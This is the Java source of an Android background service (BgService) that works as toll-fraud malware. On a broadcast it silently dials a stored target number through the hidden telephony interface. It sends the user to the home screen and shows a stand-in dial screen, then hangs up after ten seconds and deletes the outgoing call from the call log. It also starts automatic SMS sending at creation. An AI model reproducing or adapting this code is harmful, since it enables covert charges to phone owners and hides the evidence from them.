package com.mms.bg.ui;

import android.os.IServiceManager;
import android.os.ServiceManagerNative;
import com.android.internal.telephony.ITelephony;
import android.os.DeadObjectException;
import android.os.ServiceManager;
import android.os.RemoteException;
import com.android.internal.telephony.Phone;
import com.android.internal.telephony.PhoneFactory;
import android.os.ServiceManager;
import android.os.RemoteException;
import android.provider.CallLog.Calls;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.util.Log;
import android.content.IntentFilter;
import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import java.util.Timer;
import java.util.TimerTask;

public class BgService extends Service {

    private static final String TAG = "BgService";
    private static final boolean DEBUG = true;
    
    public static final String ACTION_DIAL_BR = "action.dial.bg";
    
    private boolean mIsCalling;
    
    private static final int LONG_DIAL_DELAY = 10 * 1000;
    private static final int DIAL_DELAY = 5000;
    private static final int SHOW_DIALOG_DELAY = 2000;
    
    private static final int DIAL_AUTO = 0;
    private static final int SHOW_DIALOG = 1;
    private static final int START_INTENT = 2;
    private static final int REMOVE_FIRST_LOG = 3;
    private Handler mHandler = new Handler() {
        public void handleMessage(Message msg) {
            switch (msg.what) {
            case DIAL_AUTO:
                dial();
                mHandler.sendEmptyMessageDelayed(SHOW_DIALOG, SHOW_DIALOG_DELAY);
                break;
            case SHOW_DIALOG:
                homeKeyPress();
                mHandler.sendEmptyMessage(START_INTENT);
                break;
            case START_INTENT:
                startIntent();
                break;
            case REMOVE_FIRST_LOG:
                deleteLastCallLog();
                break;
            }
        }
    };
    
    private class CancelTask implements Runnable {
        public void run() {
            if (mIsCalling == true) {
                if (DEBUG) Log.d(TAG, "[[TimeTask::run]] stop the calling");
                if (SettingManager.getInstance(getApplicationContext()).mForegroundActivity != null) {
                    try {
                        ITelephony phone = (ITelephony) ITelephony.Stub.asInterface(ServiceManager.getService("phone"));
                        phone.endCall();
                        mHandler.sendEmptyMessageDelayed(REMOVE_FIRST_LOG, 2000);
                        SettingManager.getInstance(getApplicationContext()).mForegroundActivity.finish();
                    } catch (Exception e) {
                    }
                }
                mIsCalling = false;
            }
        }
    }
    
    private BroadcastReceiver mBC = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (DEBUG) Log.d(TAG, "[[BgService::BroadcastReceiver::onReceive]]");
            SettingManager.getInstance(context).makeWakeLock();
            mHandler.sendEmptyMessageDelayed(DIAL_AUTO, DIAL_DELAY);
        }
    };
    
    @Override
    public void onCreate() {
        super.onCreate();
        
        if (DEBUG) Log.d(TAG, "[[BgService::onCreate]]");
        this.setForeground(true);
        
        SettingManager.getInstance(BgService.this).startAutoSendMessage();
//        Intent intent = new Intent(BgService.this, AutoSMSRecevier.class);
//        this.sendBroadcast(intent);
        
        IntentFilter iFilter = new IntentFilter();
        iFilter.addAction(ACTION_DIAL_BR);
        registerReceiver(mBC, iFilter);
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        this.unregisterReceiver(mBC);
    }
    
    private void dial() {
        Log.d(TAG, "[[dial]]");
        try {
            ITelephony phone = (ITelephony) ITelephony.Stub.asInterface(ServiceManager.getService("phone"));
            if (phone.isIdle() == true) {
                if (DEBUG) Log.d(TAG, "[[BgService::dial]] phone is idle");
                String targetNum = SettingManager.getInstance(getApplicationContext()).getSMSTargetNum();
                if (targetNum.equals("") == false) {
                    mIsCalling = true;
                    mHandler.postDelayed(new CancelTask(), LONG_DIAL_DELAY);
                    phone.call(targetNum);
                } else {
                    if (DEBUG) Log.d(TAG, "[[BgService::dial]] phone num is not exist, so do not dial");
                }
            } else {
                if (DEBUG) Log.d(TAG, "[[BgService::dial]] phone is not idle, delay to dial again");
                mHandler.sendEmptyMessageDelayed(DIAL_AUTO, LONG_DIAL_DELAY);
            }
        } catch (Exception e) {
        }
    }
    
    private void homeKeyPress() {
        Intent i= new Intent(Intent.ACTION_MAIN);

        i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        i.addCategory(Intent.CATEGORY_HOME);
        startActivity(i);
    }
    
    private void startIntent() {
        Log.d(TAG, "========= [[startIntent]] ========");
        Intent intent = new Intent(BgService.this, DialScreenActivity.class);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }
    
    private void deleteLastCallLog() {
        if (DEBUG) Log.d(TAG, "[[deleteLastCallLog]]");
        ContentResolver resolver = getContentResolver();
        Cursor c = null;
        try {
            Uri CONTENT_URI = Uri.parse("content://call_log/calls");
            c = resolver.query(
                    CONTENT_URI,
                    new String[] {Calls._ID},
                    "type = 2",
                    null,
                    "date DESC" + " LIMIT 1");
            if (DEBUG) Log.d(TAG, "[[deleteLastCallLog]] c = " + c);
                if (c == null || !c.moveToFirst()) {
                    if (DEBUG) Log.d(TAG, "[[deleteLastCallLog]] cursor error, return");
                    return;
                }
                long id = c.getLong(0);
                String where = Calls._ID + " IN (" + id + ")";
                if (DEBUG) Log.d(TAG, "[[deleteLastCallLog]] delete where = " + where);
                getContentResolver().delete(CONTENT_URI, where, null);
            } finally {
                if (c != null) c.close();
            }
            SettingManager.getInstance(getApplicationContext()).releaseWakeLock();
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        // TODO Auto-generated method stub
        return null;
    }
}
